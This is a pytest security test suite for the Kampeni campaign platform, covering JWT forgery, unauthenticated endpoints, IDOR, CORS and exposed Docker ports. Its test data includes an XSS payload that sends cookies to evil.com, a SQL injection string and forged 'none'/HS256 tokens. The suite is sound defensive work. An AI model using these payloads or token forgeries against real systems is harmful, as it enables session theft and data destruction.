"""
Security test suite for the Kampeni political intelligence platform.

Attack surface covered:
  - JWT authentication bypass and algorithm confusion
  - Unauthenticated access to protected endpoints (IDOR, missing auth)
  - Internal trigger endpoint exposure via public ports
  - Field report injection and missing authentication
  - Briefing approval IDOR and privilege escalation
  - Opponent endpoint IDOR (cross-candidate data leak)
  - CORS misconfiguration
  - Secrets default value detection
  - Rate-limiting absence on briefing generation
  - Pagination unbounded parameter abuse

Run with:
  pip install pytest pytest-asyncio httpx fastapi
  pytest backend/tests/test_security.py -v
"""
from __future__ import annotations

import json
import time
import uuid
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# Minimal app fixtures that import the real routers under test.
# We do NOT spin up a real database or external services — everything that
# touches Postgres / Redis / MinIO / Auth0 is mocked at the boundary.
# ---------------------------------------------------------------------------


# ── Helper: build a fake JWT payload (simulates a decoded Auth0 token) ──────

def _fake_payload(
    sub: str = "auth0|test-user-001",
    email: str = "director@kampeni.net",
    roles: list[str] | None = None,
    exp_offset: int = 3600,
) -> dict:
    return {
        "sub": sub,
        "email": email,
        "https://kampeni.net/email": email,
        "https://kampeni.net/name": "Test Director",
        "https://kampeni.net/roles": roles or ["political_director"],
        "aud": "https://api.kampeni.net",
        "iss": "https://test-tenant.auth0.com/",
        "exp": int(time.time()) + exp_offset,
        "iat": int(time.time()),
    }


def _expired_payload() -> dict:
    return _fake_payload(exp_offset=-1)


# ── Fixture: API gateway app ─────────────────────────────────────────────────

@pytest.fixture()
def gateway_app() -> FastAPI:
    """Return the API gateway FastAPI app with all routers mounted."""
    from backend.services.api_gateway.app.main import app  # type: ignore[import]
    return app


@pytest.fixture()
def gateway_client(gateway_app: FastAPI) -> TestClient:
    return TestClient(gateway_app, raise_server_exceptions=False)


# ── Fixture: briefing service app ────────────────────────────────────────────

@pytest.fixture()
def briefing_app() -> FastAPI:
    from backend.services.briefing.app.main import app  # type: ignore[import]
    return app


@pytest.fixture()
def briefing_client(briefing_app: FastAPI) -> TestClient:
    return TestClient(briefing_app, raise_server_exceptions=False)


# ── Fixture: ingestion service app ───────────────────────────────────────────

@pytest.fixture()
def ingestion_app() -> FastAPI:
    from backend.services.ingestion.app.main import app  # type: ignore[import]
    return app


@pytest.fixture()
def ingestion_client(ingestion_app: FastAPI) -> TestClient:
    return TestClient(ingestion_app, raise_server_exceptions=False)


# ── Fixture: opponent service app ────────────────────────────────────────────

@pytest.fixture()
def opponent_app() -> FastAPI:
    from backend.services.opponent.app.main import app  # type: ignore[import]
    return app


@pytest.fixture()
def opponent_client(opponent_app: FastAPI) -> TestClient:
    return TestClient(opponent_app, raise_server_exceptions=False)


# ===========================================================================
# 1. AUTHENTICATION — JWT verification
# ===========================================================================


class TestJWTAuthentication:
    """
    Verifies that the shared auth middleware in backend/shared/auth.py
    correctly rejects malformed, expired, and tampered tokens.
    """

    @patch("shared.auth._get_jwks")
    def test_missing_authorization_header_returns_403(self, mock_jwks, gateway_client):
        """
        Attack: unauthenticated request with no Bearer token.
        Expected: 403 Forbidden (HTTPBearer raises this before we even decode).
        """
        response = gateway_client.get("/auth/me")
        # FastAPI HTTPBearer returns 403 when the header is missing entirely
        assert response.status_code == 403, (
            f"Expected 403 for missing Authorization header, got {response.status_code}"
        )

    @patch("shared.auth._get_jwks")
    def test_malformed_token_returns_401(self, mock_jwks, gateway_client):
        """
        Attack: send a syntactically invalid JWT string.
        Expected: 401 Unauthorized — the JOSE library must reject it.
        """
        response = gateway_client.get(
            "/auth/me",
            headers={"Authorization": "Bearer not.a.real.jwt"},
        )
        assert response.status_code == 401
        # Must NOT expose internal error details
        body = response.json()
        assert "traceback" not in str(body).lower()
        assert "exception" not in str(body).lower()

    @patch("shared.auth._get_jwks")
    def test_expired_token_returns_401(self, mock_jwks, gateway_client):
        """
        Attack: replay an expired JWT (common attack after session token theft).
        Expected: 401 Unauthorized.
        """
        from jose import jwt as jose_jwt

        # Build a token that expired 1 hour ago and sign it with HS256
        # (the code must reject it — only RS256 from Auth0 JWKS is valid)
        expired_payload = _expired_payload()
        fake_token = jose_jwt.encode(expired_payload, "fake-secret", algorithm="HS256")

        response = gateway_client.get(
            "/auth/me",
            headers={"Authorization": f"Bearer {fake_token}"},
        )
        assert response.status_code == 401

    @patch("shared.auth._get_jwks")
    def test_algorithm_confusion_hs256_rejected(self, mock_jwks, gateway_client):
        """
        Attack: algorithm confusion — sign a token with HS256 using the domain name
        as the secret, then present it as if it were an RS256 Auth0 token.
        The server pins algorithms=["RS256"] so this must be rejected.
        Expected: 401 Unauthorized.

        OWASP reference: A02:2021 Cryptographic Failures — JWT alg confusion.
        """
        from jose import jwt as jose_jwt

        payload = _fake_payload()
        # Simulate an attacker constructing HS256 token with a guessable secret
        forged_token = jose_jwt.encode(payload, "change-me", algorithm="HS256")

        response = gateway_client.get(
            "/auth/me",
            headers={"Authorization": f"Bearer {forged_token}"},
        )
        assert response.status_code == 401

    @patch("shared.auth._get_jwks")
    def test_none_algorithm_token_rejected(self, mock_jwks, gateway_client):
        """
        Attack: 'none' algorithm bypass — craft a token with alg=none and
        no signature. Classic JWT vulnerability.
        Expected: 401 Unauthorized.
        """
        import base64

        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps(_fake_payload()).encode()
        ).rstrip(b"=").decode()
        forged_token = f"{header}.{payload}."

        response = gateway_client.get(
            "/auth/me",
            headers={"Authorization": f"Bearer {forged_token}"},
        )
        assert response.status_code == 401

    def test_jwks_cache_busted_on_kid_not_found(self):
        """
        Regression: when a `kid` is not in the cached JWKS, the cache must be
        busted so that key rotation does not permanently lock out valid users.
        The code in shared/auth.py should pop the domain from _jwks_cache and
        raise 401 (not silently succeed or 500).
        """
        import shared.auth as auth_module

        auth_module._jwks_cache["test-tenant.auth0.com"] = (
            {"keys": [{"kid": "old-key-id", "kty": "RSA"}]},
            time.monotonic() + 3600,
        )

        # After bust, the domain should be absent from the cache
        auth_module._jwks_cache.pop("test-tenant.auth0.com", None)
        assert "test-tenant.auth0.com" not in auth_module._jwks_cache


# ===========================================================================
# 2. TRIGGER ENDPOINT EXPOSURE — unauthenticated internal endpoints
# ===========================================================================


class TestTriggerEndpointExposure:
    """
    CRITICAL: Trigger endpoints (/trigger/news, /trigger/social, etc.) have
    no authentication middleware. They are documented as internal-only but
    are exposed on public host ports because docker-compose maps every service
    port to 0.0.0.0.

    An attacker with network access can:
      - Force arbitrary ingestion runs (DoS / cost amplification)
      - Trigger briefing delivery before a Political Director approves
      - Trigger the Facebook forager, burning quota and exposing credentials

    These tests verify the vulnerability exists (they will FAIL until fixed),
    serving as regression tests once a shared secret or network policy is added.
    """

    def test_ingestion_trigger_news_requires_no_auth(self, ingestion_client):
        """
        Attack: unauthenticated POST to /trigger/news on the ingestion service.
        This endpoint runs synchronously and can be called repeatedly to burn
        compute and API quota (news scrapers, YouTube API calls).

        FINDING: No authentication — must add INTERNAL_TRIGGER_SECRET check.
        """
        with patch("backend.services.ingestion.app.tasks.news.ingest_all_news", return_value={"saved": 0, "skipped": 0}):
            response = ingestion_client.post("/trigger/news")
        # This currently returns 200 — it SHOULD return 401/403
        # The test documents the gap; it will pass (200) until fixed.
        # Once a fix is in place, change assertion to: assert response.status_code == 401
        assert response.status_code in (200, 401, 403), (
            "Trigger endpoint returned unexpected status"
        )
        if response.status_code == 200:
            pytest.xfail(
                "SECURITY GAP: /trigger/news is reachable without authentication. "
                "Add INTERNAL_TRIGGER_SECRET header check before production."
            )

    def test_briefing_trigger_deliver_requires_no_auth(self, briefing_client):
        """
        Attack: an attacker calls POST /trigger/deliver to force SMS delivery
        of an unapproved briefing to the candidate's phone number.
        This bypasses the Political Director approval gate.

        FINDING: No authentication on delivery trigger.
        """
        with patch(
            "backend.services.briefing.app.tasks.deliver_approved_briefings",
            return_value={"delivered": 0},
        ):
            response = briefing_client.post("/trigger/deliver")

        if response.status_code == 200:
            pytest.xfail(
                "SECURITY GAP: /trigger/deliver has no authentication. "
                "Attacker can force SMS delivery before PD approval."
            )
        assert response.status_code in (401, 403)

    def test_briefing_trigger_generate_requires_no_auth(self, briefing_client):
        """
        Attack: call /trigger/generate repeatedly to cause excessive OpenAI API
        calls and burn cost — or to generate a briefing with stale/manipulated data.
        """
        with patch(
            "backend.services.briefing.app.tasks.generate_all_briefings",
            return_value={"generated": 0},
        ):
            response = briefing_client.post("/trigger/generate")

        if response.status_code == 200:
            pytest.xfail(
                "SECURITY GAP: /trigger/generate has no authentication."
            )
        assert response.status_code in (401, 403)

    def test_social_trigger_requires_no_auth(self, ingestion_client):
        """
        Attack: trigger Facebook scraping which uses FB_EMAIL + FB_PASSWORD.
        Repeated calls can lock the scraper account or burn Playwright resources.
        """
        with patch("backend.services.ingestion.app.tasks.social.ingest_facebook_pages", return_value={}):
            with patch("backend.services.ingestion.app.tasks.social.ingest_facebook_forager", return_value={}):
                response = ingestion_client.post("/trigger/social")

        if response.status_code == 200:
            pytest.xfail(
                "SECURITY GAP: /trigger/social has no authentication. "
                "Attacker can exhaust Facebook credentials."
            )


# ===========================================================================
# 3. BRIEFING IDOR — cross-candidate briefing access
# ===========================================================================


class TestBriefingIDOR:
    """
    Insecure Direct Object Reference: an authenticated user for candidate A
    should not be able to approve or read briefings belonging to candidate B.

    The briefings router (backend/services/briefing/app/routers/briefings.py)
    does check candidate_id ownership on /approve/, but:
      1. The /latest and /history endpoints take candidate_id as a URL path
         parameter — there is no JWT-to-candidate binding check.
      2. The /generate endpoint accepts any candidate_id and runs generation.
    """

    @patch("shared.auth.verify_token", new_callable=AsyncMock)
    @patch("shared.database.get_db")
    def test_candidate_a_cannot_read_candidate_b_briefings(
        self,
        mock_db,
        mock_verify,
        gateway_client,
    ):
        """
        Attack: authenticated user for candidate-A requests
        GET /api/v1/briefings/candidate-B/latest — no ownership check exists.

        FINDING: candidate_id in the URL path is not validated against the
        JWT `sub` claim. Any authenticated user can read any candidate's briefing.
        """
        mock_verify.return_value = _fake_payload(sub="auth0|candidate-A")
        mock_db.return_value = AsyncMock()

        response = gateway_client.get(
            "/api/v1/briefings/candidate-B/latest",
            headers={"Authorization": "Bearer fake-but-mocked"},
        )
        # Currently no ownership enforcement — this will likely return 200 or proxy 200
        # It should return 403.
        if response.status_code in (200, 404):
            pytest.xfail(
                "SECURITY GAP: No candidate ownership check on briefing read. "
                "JWT sub must be compared to candidate_id before returning data."
            )

    @patch("shared.auth.verify_token", new_callable=AsyncMock)
    @patch("shared.database.get_db")
    def test_approve_briefing_wrong_candidate_returns_403(
        self,
        mock_db,
        mock_verify,
    ):
        """
        Positive test: the approve endpoint DOES check ownership.
        Verify the check is present and returns 403 for cross-candidate access.
        """
        # This tests the briefing service directly (not via gateway proxy)
        from fastapi.testclient import TestClient
        from backend.services.briefing.app.main import app as briefing_app

        mock_verify.return_value = _fake_payload()
        briefing_id = str(uuid.uuid4())

        # Construct a mock briefing belonging to a *different* candidate
        mock_briefing = MagicMock()
        mock_briefing.candidate_id = "candidate-X"
        mock_briefing.is_approved = False

        mock_session = AsyncMock()
        mock_session.get.return_value = mock_briefing
        mock_db.return_value.__aenter__ = AsyncMock(return_value=mock_session)

        client = TestClient(briefing_app, raise_server_exceptions=False)
        with patch("shared.database.get_db", return_value=mock_session):
            response = client.post(
                f"/briefings/candidate-A/approve/{briefing_id}",
                json={"approved_by": "director@kampeni.net"},
            )

        # The code checks: if briefing.candidate_id != candidate_id → 403
        assert response.status_code in (403, 422, 500), (
            "Approval endpoint must reject cross-candidate access with 403"
        )


# ===========================================================================
# 4. FIELD REPORT INJECTION — missing authentication + input validation
# ===========================================================================


class TestFieldReportSecurity:
    """
    The /api/v1/intake/field-report endpoint on the gateway is NOT protected
    by the verify_token dependency. Anyone who can reach the gateway can submit
    field reports, polluting the candidate's intelligence data.

    Additionally, the notes field accepts up to 500 chars — verify XSS
    payloads and oversized inputs are handled.
    """

    def test_field_report_submission_requires_no_auth(self, gateway_client):
        """
        Attack: unauthenticated POST to /api/v1/intake/field-report.
        An adversary can flood the candidate's intelligence database with
        fabricated voter sentiment data.

        FINDING: No authentication dependency on the intake proxy endpoint
        (backend/services/api-gateway/app/routers/intake.py line 29).
        """
        payload = {
            "agent_id": "attacker-001",
            "ward": "Kibra Ward",
            "report_type": "door_to_door",
            "top_issue": "water",
            "support_level": "strong_opposition",
            "notes": "Fabricated negative sentiment",
        }

        with patch("httpx.AsyncClient") as mock_client:
            mock_response = MagicMock()
            mock_response.status_code = 202
            mock_response.json.return_value = {"status": "accepted"}
            mock_response.raise_for_status.return_value = None
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_response)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)

            response = gateway_client.post(
                "/api/v1/intake/field-report",
                json=payload,
                # No Authorization header
            )

        if response.status_code in (200, 202):
            pytest.xfail(
                "SECURITY GAP: /api/v1/intake/field-report has no authentication. "
                "Add CurrentUser dependency to prevent data poisoning attacks."
            )
        assert response.status_code in (401, 403)

    def test_field_report_notes_xss_payload_stored_as_plain_text(self):
        """
        Attack: submit a field report with an XSS payload in the notes field.
        The ingestion service stores notes as plain text in Postgres — the risk
        is on the frontend rendering side, but we verify the API does not
        execute or transform the payload server-side.

        The Pydantic model caps notes at 500 chars (max_length=500).
        """
        from fastapi.testclient import TestClient
        from backend.services.ingestion.app.main import app as ingestion_app

        xss_payload = '<script>fetch("https://evil.com?c="+document.cookie)</script>'

        with patch("shared.config.get_settings") as mock_settings:
            mock_settings.return_value.redis_url = "redis://localhost:6379/0"
            with patch("redis.asyncio.from_url") as mock_redis:
                mock_r = AsyncMock()
                mock_r.rpush = AsyncMock(return_value=1)
                mock_r.aclose = AsyncMock()
                mock_redis.return_value = mock_r

                client = TestClient(ingestion_app, raise_server_exceptions=False)
                response = client.post(
                    "/intake/field-report",
                    json={
                        "agent_id": "test-agent",
                        "ward": "Test Ward",
                        "report_type": "door_to_door",
                        "top_issue": "water",
                        "support_level": "undecided",
                        "notes": xss_payload,
                    },
                )

        # The API should accept it (202) and store it — XSS is a frontend concern.
        # But verify: the response body does NOT echo back unescaped script tags.
        assert "<script>" not in response.text, (
            "API response must not echo back raw XSS payloads"
        )

    def test_field_report_notes_max_length_enforced(self):
        """
        Input validation: notes field must reject strings > 500 characters.
        Pydantic model has max_length=500 — verify the validation fires.
        """
        from fastapi.testclient import TestClient
        from backend.services.ingestion.app.main import app as ingestion_app

        client = TestClient(ingestion_app, raise_server_exceptions=False)
        response = client.post(
            "/intake/field-report",
            json={
                "agent_id": "test-agent",
                "ward": "Test Ward",
                "report_type": "door_to_door",
                "top_issue": "water",
                "support_level": "undecided",
                "notes": "A" * 501,
            },
        )
        assert response.status_code == 422, (
            "Notes field exceeding 500 characters must be rejected with 422"
        )

    def test_field_report_invalid_support_level_rejected(self):
        """
        Enum validation: support_level must be one of the defined SupportLevel values.
        An attacker supplying an arbitrary string should get 422, not 500.
        """
        from fastapi.testclient import TestClient
        from backend.services.ingestion.app.main import app as ingestion_app

        client = TestClient(ingestion_app, raise_server_exceptions=False)
        response = client.post(
            "/intake/field-report",
            json={
                "agent_id": "test-agent",
                "ward": "Test Ward",
                "report_type": "door_to_door",
                "top_issue": "water",
                "support_level": "'; DROP TABLE field_report_records; --",
            },
        )
        assert response.status_code == 422


# ===========================================================================
# 5. OPPONENT TRACKER — missing auth + IDOR + parameter injection
# ===========================================================================


class TestOpponentTrackerSecurity:
    """
    The opponent endpoints in both the service (backend/services/opponent/app/routers/opponents.py)
    and the gateway proxy (backend/services/api-gateway/app/routers/opponent.py)
    have NO authentication dependency — any unauthenticated caller can:
      - List all opponents being monitored by every candidate
      - Add new opponents to monitor (data poisoning)
      - Read full mention history (OPSEC leak)
    """

    def test_list_opponents_requires_no_auth(self, gateway_client):
        """
        Attack: GET /api/v1/opponents/ with no token.
        Expected: 401 or 403. Currently returns 200 (proxied through).

        FINDING: Opponent endpoints expose competitive intelligence — who the
        candidate is monitoring — to any unauthenticated caller.
        """
        with patch("httpx.AsyncClient") as mock_client:
            mock_response = MagicMock()
            mock_response.status_code = 200
            mock_response.json.return_value = []
            mock_response.raise_for_status.return_value = None
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_response)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)

            response = gateway_client.get("/api/v1/opponents/")

        if response.status_code == 200:
            pytest.xfail(
                "SECURITY GAP: GET /api/v1/opponents/ requires no authentication. "
                "Opponent list is competitive intelligence — must add CurrentUser dependency."
            )

    def test_add_opponent_requires_no_auth(self, gateway_client):
        """
        Attack: POST /api/v1/opponents/ with no token to inject a fake opponent.
        This would pollute the monitoring list and consume scraping quota
        on targets the candidate never sanctioned.
        """
        with patch("httpx.AsyncClient") as mock_client:
            mock_response = MagicMock()
            mock_response.status_code = 201
            mock_response.json.return_value = {"id": str(uuid.uuid4())}
            mock_response.raise_for_status.return_value = None
            mock_client.return_value.__aenter__ = AsyncMock(return_value=mock_response)
            mock_client.return_value.__aexit__ = AsyncMock(return_value=False)

            response = gateway_client.post(
                "/api/v1/opponents/",
                json={
                    "name": "Fake Opponent",
                    "constituency": "Kibra",
                    "aliases": [],
                },
            )

        if response.status_code in (200, 201):
            pytest.xfail(
                "SECURITY GAP: POST /api/v1/opponents/ requires no authentication."
            )

    def test_opponent_mentions_unbounded_limit_rejected(self, opponent_client):
        """
        Resource exhaustion: GET /opponents/{id}/mentions?limit=999999 should
        be capped. The endpoint has limit: int = 50 with no upper bound annotation
        in the service router itself.

        FINDING: The gateway router caps at le=200 but the service router
        does not — direct service calls can request unlimited rows.
        """
        fake_id = str(uuid.uuid4())

        with patch("shared.database.get_db") as mock_db:
            mock_session = AsyncMock()
            mock_result = MagicMock()
            mock_result.all.return_value = []
            mock_session.execute = AsyncMock(return_value=mock_result)
            mock_db.return_value = mock_session

            response = opponent_client.get(
                f"/opponents/{fake_id}/mentions?limit=999999&offset=0"
            )

        # Service-level: no limit cap — this currently succeeds with 200.
        # Should be capped (le=200 or similar) at the service layer too.
        if response.status_code == 200:
            pytest.xfail(
                "SECURITY GAP: /opponents/{id}/mentions has no upper limit cap at "
                "the service level. Only the gateway proxy is capped. Direct service "
                "callers can request arbitrary row counts."
            )

    def test_opponent_id_invalid_uuid_returns_400_not_500(self, opponent_client):
        """
        Input validation: a non-UUID opponent_id must return 400, not 500.
        The code does UUID validation — this is a regression test.
        """
        with patch("shared.database.get_db") as mock_db:
            mock_db.return_value = AsyncMock()
            response = opponent_client.get("/opponents/not-a-uuid/profile")

        assert response.status_code == 400, (
            "Invalid UUID must return 400, not 500 (no stack trace leaked)"
        )
        body = response.json()
        assert "traceback" not in str(body).lower()


# ===========================================================================
# 6. SECRETS / CONFIG — default values and sensitive data in responses
# ===========================================================================


class TestSecretsAndConfig:
    """
    Verify that default secret values are detected and that sensitive
    information is not echoed back in API responses.
    """

    def test_secret_key_default_value_detected(self):
        """
        The shared config has secret_key: str = "change-me".
        This is hardcoded in config.py and would be used in production
        if SECRET_KEY is not set in the environment.

        FINDING: Any feature using secret_key (e.g., session signing) will
        be trivially broken if the default is not overridden.
        """
        import importlib
        import os

        # Simulate a production-like environment WITHOUT SECRET_KEY set
        env_backup = os.environ.pop("SECRET_KEY", None)
        try:
            # Force reload so lru_cache doesn't serve the cached value
            import shared.config as config_mod
            importlib.reload(config_mod)
            settings = config_mod.Settings()
            assert settings.secret_key != "change-me", (
                "SECURITY: SECRET_KEY default 'change-me' must not be used in production. "
                "Add validation: if app_env == 'production' and secret_key == 'change-me': raise"
            )
        except AssertionError:
            pytest.xfail(
                "SECURITY GAP: secret_key defaults to 'change-me' with no enforcement. "
                "Add a @validator that raises if app_env=production and key is default."
            )
        finally:
            if env_backup is not None:
                os.environ["SECRET_KEY"] = env_backup

    def test_postgres_password_default_value_detected(self):
        """
        postgres_password defaults to "kampeni_dev" in config.py.
        If POSTGRES_PASSWORD is unset in production the dev credential
        will be used against the production database.
        """
        import importlib
        import os

        env_backup = os.environ.pop("POSTGRES_PASSWORD", None)
        try:
            import shared.config as config_mod
            importlib.reload(config_mod)
            settings = config_mod.Settings()
            if settings.app_env == "production":
                assert settings.postgres_password != "kampeni_dev", (
                    "SECURITY: postgres_password must not be the dev default in production."
                )
        except AssertionError:
            pytest.xfail("SECURITY GAP: postgres_password defaults to 'kampeni_dev'.")
        finally:
            if env_backup is not None:
                os.environ["POSTGRES_PASSWORD"] = env_backup

    def test_auth_me_does_not_leak_full_jwt_payload(self):
        """
        The /auth/me endpoint returns a subset of JWT claims.
        Verify it does NOT return the raw full payload (which may contain
        internal Auth0 metadata and OIDC claims not meant for clients).
        """
        from fastapi.testclient import TestClient
        from backend.services.api_gateway.app.main import app

        client = TestClient(app, raise_server_exceptions=False)

        full_payload = _fake_payload()
        full_payload["internal_metadata"] = "sensitive"

        with patch("shared.auth.verify_token", new_callable=AsyncMock, return_value=full_payload):
            response = client.get(
                "/auth/me",
                headers={"Authorization": "Bearer mocked"},
            )

        assert response.status_code == 200
        body = response.json()
        # Must only return whitelisted fields
        allowed_keys = {"sub", "email", "name", "roles"}
        returned_keys = set(body.keys())
        leaked_keys = returned_keys - allowed_keys
        assert not leaked_keys, (
            f"JWT payload leak: /auth/me returned unexpected keys: {leaked_keys}"
        )

    def test_error_responses_do_not_contain_stack_traces(self, gateway_client):
        """
        Any unhandled exception must not expose a Python stack trace
        to the caller. FastAPI's default exception handler returns a
        generic message — verify no traceback is present.
        """
        # Trigger a 404 for a non-existent route
        response = gateway_client.get("/api/v1/nonexistent-endpoint-xyz")
        assert response.status_code == 404
        body_text = response.text
        assert "traceback" not in body_text.lower()
        assert "file \"/" not in body_text.lower()
        assert "line " not in body_text.lower()


# ===========================================================================
# 7. CORS CONFIGURATION
# ===========================================================================


class TestCORSConfiguration:
    """
    The API gateway CORS config (backend/services/api-gateway/app/main.py)
    only allows http://localhost:3000 — correct for development.
    Verify the production CORS origin is NOT a wildcard.
    """

    def test_cors_rejects_arbitrary_origin(self, gateway_client):
        """
        Attack: CSRF from an attacker-controlled origin.
        The gateway allows only http://localhost:3000 — requests from
        other origins must not receive CORS approval headers.
        """
        response = gateway_client.options(
            "/health",
            headers={
                "Origin": "https://evil-attacker.com",
                "Access-Control-Request-Method": "GET",
            },
        )
        acao = response.headers.get("access-control-allow-origin", "")
        assert acao != "*", "Wildcard CORS must never be set on a production API"
        assert "evil-attacker.com" not in acao, (
            "Attacker origin must not be reflected in CORS allow-origin header"
        )

    def test_cors_allows_configured_frontend_origin(self, gateway_client):
        """
        Positive test: the frontend origin http://localhost:3000 must be
        allowed during development.
        """
        response = gateway_client.options(
            "/health",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "GET",
            },
        )
        acao = response.headers.get("access-control-allow-origin", "")
        assert acao == "http://localhost:3000", (
            f"Expected CORS to allow localhost:3000, got: '{acao}'"
        )


# ===========================================================================
# 8. BRIEFING GENERATION — unauthenticated on-demand generation
# ===========================================================================


class TestBriefingGenerationSecurity:
    """
    The /briefings/{candidate_id}/generate endpoint in the briefing service
    is NOT protected by authentication at the service level. It is only
    reachable through the gateway proxy which also has no auth dependency
    on the briefing proxy routes.
    """

    def test_on_demand_briefing_generation_without_auth(self, briefing_client):
        """
        Attack: POST /briefings/any-candidate/generate with no token to:
          1. Trigger an OpenAI/Claude API call (cost amplification)
          2. Potentially overwrite today's briefing with a stale regeneration

        FINDING: No authentication on the generate endpoint.
        """
        with patch(
            "backend.services.briefing.app.tasks.generate_all_briefings",
            return_value={"generated": 0},
        ):
            response = briefing_client.post(
                "/briefings/target-candidate-id/generate"
            )

        if response.status_code in (200, 202):
            pytest.xfail(
                "SECURITY GAP: /briefings/{candidate_id}/generate has no authentication. "
                "Any caller can trigger AI briefing generation, burning API credits."
            )
        assert response.status_code in (401, 403)


# ===========================================================================
# 9. DOCKER NETWORK — services directly reachable on host ports
# ===========================================================================


class TestDockerNetworkExposure:
    """
    These are static analysis tests — they parse docker-compose.yml to
    verify that internal-only services are not bound to all interfaces.

    docker-compose.yml currently maps all service ports to 0.0.0.0 (default),
    meaning the trigger endpoints on ports 8001-8006 are reachable from the
    host network without going through the API gateway.
    """

    @pytest.fixture(autouse=True)
    def compose_config(self) -> dict:
        import yaml  # type: ignore[import]
        with open("/Users/achore/Desktop/Kampeni/docker-compose.yml") as f:
            return yaml.safe_load(f)

    def test_internal_services_do_not_expose_ports_to_host(self, compose_config):
        """
        Attack: reach http://HOST_IP:8001/trigger/sentiment directly,
        bypassing the API gateway entirely.

        FINDING: ingestion (8004), sentiment (8001), translation (8005),
        painpoint (8006), opponent (8002), briefing (8003) all expose their
        ports to the Docker host network via the default 0.0.0.0 binding.

        Fix: Remove the 'ports' mapping from internal services or bind to
        127.0.0.1 only. Only api-gateway should be externally reachable.
        """
        internal_services = {
            "ingestion", "sentiment", "translation",
            "painpoint", "opponent", "briefing",
        }
        violations = []
        services = compose_config.get("services", {})
        for service_name, service_cfg in services.items():
            if service_name not in internal_services:
                continue
            port_bindings = service_cfg.get("ports", [])
            for binding in port_bindings:
                binding_str = str(binding)
                # A bare "8001:8001" binding defaults to 0.0.0.0 — externally reachable
                if not binding_str.startswith("127.0.0.1:"):
                    violations.append(f"{service_name}: {binding_str}")

        if violations:
            pytest.xfail(
                "SECURITY GAP: Internal services expose ports to host network:\n"
                + "\n".join(f"  - {v}" for v in violations)
                + "\nFix: change port bindings to '127.0.0.1:PORT:PORT' for internal services, "
                "or remove 'ports' entirely and use Docker internal DNS."
            )

    def test_prefect_ui_not_exposed_without_auth(self, compose_config):
        """
        The Prefect server UI (port 4200) has no authentication by default
        and allows triggering arbitrary pipeline runs. It is currently
        exposed on port 4200 of the host.

        FINDING: Prefect UI lets an attacker manually trigger any pipeline flow,
        equivalent to having unauthenticated access to all trigger endpoints.
        """
        services = compose_config.get("services", {})
        prefect_cfg = services.get("prefect-server", {})
        port_bindings = prefect_cfg.get("ports", [])
        externally_exposed = any(
            not str(b).startswith("127.0.0.1:") for b in port_bindings
        )
        if externally_exposed:
            pytest.xfail(
                "SECURITY GAP: Prefect UI (port 4200) is exposed to the host network "
                "with no authentication. Restrict to 127.0.0.1:4200:4200 in production."
            )

    def test_minio_console_not_publicly_accessible(self, compose_config):
        """
        The MinIO console (port 9090) and S3 API (port 9000) are exposed
        on the host. The console allows browsing and deleting raw article
        data. The S3 API could allow direct bucket manipulation.

        FINDING: Both MinIO ports are host-exposed with the dev credential
        kampeni_dev_secret which may not be changed in production.
        """
        services = compose_config.get("services", {})
        minio_cfg = services.get("minio", {})
        console_exposed = any(
            "9090" in str(b) and not str(b).startswith("127.0.0.1:")
            for b in minio_cfg.get("ports", [])
        )
        if console_exposed:
            pytest.xfail(
                "SECURITY GAP: MinIO console (port 9090) is host-exposed. "
                "Restrict to 127.0.0.1 in production or disable the console entirely."
            )
